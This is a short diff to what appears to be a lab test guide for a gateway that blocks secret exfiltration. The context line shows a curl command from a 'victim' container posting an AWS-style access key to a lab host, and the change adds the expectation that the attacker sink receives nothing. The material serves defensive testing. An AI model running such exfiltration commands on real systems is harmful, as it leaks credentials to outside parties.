@@ -37,7 +37,7 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOS
 ```
 
 
-- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs.
+- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs, nothing received on Attacker sink.
 
 
 
